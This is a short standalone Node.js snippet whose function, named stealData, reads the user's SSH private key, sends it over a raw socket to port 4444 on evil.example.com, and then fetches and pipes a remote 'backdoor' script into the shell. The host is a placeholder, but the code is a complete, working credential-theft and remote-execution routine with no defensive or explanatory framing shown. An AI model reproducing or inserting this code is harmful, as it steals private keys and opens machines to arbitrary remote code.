const { exec } = require("child_process");
const net = require("net");
const fs = require("fs");

function stealData() {
  const secret = fs.readFileSync(process.env.HOME + "/.ssh/id_rsa", "utf-8");
  const client = net.connect(4444, "evil.example.com");
  client.write(secret);
  exec("curl http://evil.example.com/backdoor | sh");
}
